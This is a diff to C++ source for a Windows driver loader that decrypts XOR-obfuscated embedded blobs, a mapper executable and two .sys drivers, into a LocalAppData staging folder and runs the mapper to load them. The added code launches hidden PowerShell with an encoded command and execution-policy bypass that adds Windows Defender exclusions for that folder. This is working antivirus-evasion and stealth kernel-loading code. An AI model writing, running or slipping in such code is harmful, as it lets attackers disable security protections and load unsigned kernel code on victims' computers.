@@ -8,11 +8,18 @@
 #endif
 #include <windows.h>
 #include <bcrypt.h>
+#include <shlobj.h>
+#include <objbase.h>
+#include <wincrypt.h>
 #include <cstdio>
 #include <cstring>
 #include <string>
+#include <filesystem>
 
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "crypt32.lib")
 
 namespace
 {
@@ -56,19 +63,120 @@ namespace
         return true;
     }
 
-    std::wstring get_temp_sys_path()
+    std::wstring get_stage_dir()
     {
-        wchar_t tmp[MAX_PATH] = {};
-        if (!GetTempPathW(MAX_PATH, tmp))
+        wchar_t* local = nullptr;
+        if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, nullptr, &local)) || !local)
             return {};
-        wchar_t file[MAX_PATH] = {};
-        if (!GetTempFileNameW(tmp, L"drv", 0, file))
+        std::filesystem::path p(local);
+        CoTaskMemFree(local);
+        p /= L"AiDA";
+        p /= L"Standalone";
+        p /= L"stage";
+        std::error_code ec;
+        std::filesystem::create_directories(p, ec);
+        if (ec)
             return {};
+        return p.wstring();
+    }
 
-        std::wstring path(file);
-        DeleteFileW(path.c_str());
-        path += L".sys";
-        return path;
+    std::wstring random_token(size_t bytes)
+    {
+        std::wstring out;
+        unsigned char raw[32] = {};
+        if (bytes > sizeof(raw))
+            bytes = sizeof(raw);
+        if (BCryptGenRandom(nullptr, raw, static_cast<ULONG>(bytes),
+                            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
+            return out;
+        static const wchar_t* hex = L"0123456789abcdef";
+        out.reserve(bytes * 2);
+        for (size_t i = 0; i < bytes; ++i) {
+            out.push_back(hex[(raw[i] >> 4) & 0xF]);
+            out.push_back(hex[raw[i] & 0xF]);
+        }
+        return out;
+    }
+
+    std::wstring make_stage_path(const std::wstring& dir, const wchar_t* ext)
+    {
+        if (dir.empty())
+            return {};
+        std::wstring name = random_token(8);
+        if (name.empty())
+            return {};
+        std::filesystem::path p = std::filesystem::path(dir) / (name + ext);
+        return p.wstring();
+    }
+
+    std::wstring base64_encode_utf16(const std::wstring& s)
+    {
+        std::wstring out;
+        if (s.empty())
+            return out;
+        DWORD bytes = static_cast<DWORD>(s.size() * sizeof(wchar_t));
+        DWORD encoded = 0;
+        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
+                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
+                                  nullptr, &encoded) || encoded == 0)
+            return out;
+        out.resize(encoded);
+        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
+                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
+                                  &out[0], &encoded)) {
+            out.clear();
+            return out;
+        }
+        if (!out.empty() && out.back() == L'\0')
+            out.pop_back();
+        return out;
+    }
+
+    void register_defender_exclusion(const std::wstring& dir)
+    {
+        if (dir.empty())
+            return;
+
+        std::wstring quoted;
+        quoted.reserve(dir.size() * 2 + 4);
+        quoted.push_back(L'\'');
+        for (wchar_t c : dir) {
+            if (c == L'\'')
+                quoted.push_back(L'\'');
+            quoted.push_back(c);
+        }
+        quoted.push_back(L'\'');
+
+        std::wstring script =
+            L"$ErrorActionPreference='SilentlyContinue';"
+            L"try{Add-MpPreference -ExclusionPath " + quoted + L" -Force}catch{};"
+            L"try{Add-MpPreference -ExclusionProcess " + quoted + L" -Force}catch{}";
+
+        std::wstring encoded = base64_encode_utf16(script);
+        if (encoded.empty())
+            return;
+
+        wchar_t sysdir[MAX_PATH] = {};
+        if (!GetSystemDirectoryW(sysdir, MAX_PATH))
+            return;
+        std::wstring exe = std::wstring(sysdir) + L"\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+        std::wstring cmdline = L"\"" + exe +
+            L"\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " +
+            encoded;
+
+        STARTUPINFOW si = {};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = {};
+        if (!CreateProcessW(exe.c_str(), &cmdline[0], nullptr, nullptr, FALSE,
+                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+            return;
+
+        WaitForSingleObject(pi.hProcess, 30000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
 
     bool decrypt_and_write(const unsigned char* enc, unsigned long enc_size,
@@ -91,7 +199,7 @@ namespace
 
         HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                 CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, nullptr);
+                                FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
             SecureZeroMemory(buf, enc_size);
             VirtualFree(buf, 0, MEM_RELEASE);
@@ -108,24 +216,15 @@ namespace
         return ok && written == enc_size;
     }
 
-    std::wstring write_embedded_mapper()
+    bool write_embedded_mapper(const std::wstring& path)
     {
-        wchar_t tmp[MAX_PATH] = {};
-        if (!GetTempPathW(MAX_PATH, tmp))
-            return {};
-        wchar_t file[MAX_PATH] = {};
-        if (!GetTempFileNameW(tmp, L"map", 0, file))
-            return {};
-
-        std::wstring path(file);
-        DeleteFileW(path.c_str());
-        path += L".exe";
-
+        if (path.empty())
+            return false;
 
         auto* buf = static_cast<unsigned char*>(
             VirtualAlloc(nullptr, g_windmapper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
         if (!buf)
-            return {};
+            return false;
 
         for (unsigned long i = 0; i < g_windmapper_size; ++i)
             buf[i] = g_windmapper_data[i] ^ MAPPER_KEY[i % sizeof(MAPPER_KEY)];
@@ -133,17 +232,16 @@ namespace
         if (!verify_blob_integrity(buf, g_windmapper_size, g_windmapper_size)) {
             SecureZeroMemory(buf, g_windmapper_size);
             VirtualFree(buf, 0, MEM_RELEASE);
-            return {};
+            return false;
         }
 
         HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                 CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY |
-                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
+                                FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
             SecureZeroMemory(buf, g_windmapper_size);
             VirtualFree(buf, 0, MEM_RELEASE);
-            return {};
+            return false;
         }
 
         DWORD written = 0;
@@ -155,10 +253,10 @@ namespace
 
         if (!ok || written != g_windmapper_size) {
             DeleteFileW(path.c_str());
-            return {};
+            return false;
         }
 
-        return path;
+        return true;
     }
 
     void secure_delete(const std::wstring& path)
@@ -196,16 +294,20 @@ namespace driver_loader
         if (g_loaded)
             return true;
 
-        std::wstring mapper_path = write_embedded_mapper();
-        if (mapper_path.empty())
+        std::wstring stage = get_stage_dir();
+        if (stage.empty())
             return false;
 
-        std::wstring whoswho_path = get_temp_sys_path();
-        std::wstring sentinel_path = get_temp_sys_path();
-        if (whoswho_path.empty() || sentinel_path.empty()) {
-            secure_delete(mapper_path);
+        register_defender_exclusion(stage);
+
+        std::wstring mapper_path = make_stage_path(stage, L".exe");
+        std::wstring whoswho_path = make_stage_path(stage, L".sys");
+        std::wstring sentinel_path = make_stage_path(stage, L".sys");
+        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty())
             return false;
-        }
+
+        if (!write_embedded_mapper(mapper_path))
+            return false;
 
         if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
                                WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
@@ -219,11 +321,6 @@ namespace driver_loader
             secure_delete(whoswho_path);
             return false;
         }
-
-        SetFileAttributesW(whoswho_path.c_str(),
-                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
-        SetFileAttributesW(sentinel_path.c_str(),
-                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
         std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                                whoswho_path + L"\" \"" + sentinel_path + L"\"";
